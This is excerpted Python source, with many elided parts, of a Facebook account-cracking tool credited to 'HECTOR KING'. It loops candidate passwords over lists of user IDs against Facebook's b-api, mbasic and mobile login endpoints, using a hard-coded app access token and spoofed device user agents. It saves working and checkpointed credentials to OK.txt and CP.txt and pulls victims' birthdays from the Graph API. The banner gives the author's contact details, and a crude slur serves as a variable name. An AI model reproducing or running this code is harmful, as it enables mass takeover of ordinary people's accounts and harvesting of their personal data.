...
def readline___Public_Xml():
	...
	print(" [2] Create Supper File [ Unlimited ]")
	print(" [3] Feedback")
	print(" [4] YouTube ")
...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#HECTOR_KING ('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = HECTOR (self.apk).read().splitlines()
			HECTOR_KING(' [*] Total ID : %s'%(len(self.id)))
			print (' [✓] Are You Want To Continue : Type Y')
		except:
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							HECTOR_KING('[•] Result CP saved to CP.txt')
							HECTOR_KING('\n\tCrack Processing...\n')
							HECTOR_KING('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					HECTOR_KING('\n01.) Metode b-api ')
					HECTOR_KING('02.) Metode mbasic ')
					HECTOR_KING('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			HECTOR_KING('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			HECTOR_KING(' [1] HECTOR Method 1 ')
			HECTOR_KING(' [2] HECTOR Method 2  [ Pro ]')
			HECTOR_KING(' [3] HECTOR Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [HECTOR] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			try:
				ua_xiaomi = HECTOR('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			p = Prof_HECTOR("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
			if "access_token" in p:
				HECTOR_KING('\r\033[1;92m[Successful-AKING] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					token = HECTOR('login.txt').read()
					cp_ttl = Prof_Hector('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					HECTOR_KING('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				HECTOR_KING('\r\033[1;91m[CP-HECTOR] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				HECTOR_KING('\r\033[1;32m[Success-KING] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = HECTOR('token.txt').read()
					cp_ttl = Prof_HECTOR('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].HECTOR_KING('\r\033[1;91m[CP-KING] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
					...
					pass
				HECTOR_KING('\r\033[1;91m[CP-KING] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				HECTOR_KING('\r\033[1;92m[Success-KING] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					HECTOR_KING('\r\033[1;91m[CP-KING] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
...
hectork_ua_xaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
hectork_ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
hectork_ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
hectork_ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
hectork_ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
hectork_ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
hectork_ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
hectork_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
banner="""\033[1;37m
       ###       ##    ## #### ##    ##  ######
      ## ##      ##   ##   ##  ###   ## ##    ##
     ##   ##     ##  ##    ##  ####  ## ##
 ...
 [*]=============================================
    Author   : HECTOR KING
    Facebook : https://www.facebook.com/itzhector786
    Team     : HECTOR & CHAND 
    Connect  : 03231967904
 [*]=============================================
...
def dupcutter():
	os.system("xdg-open https://wa.me/+923231967904")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
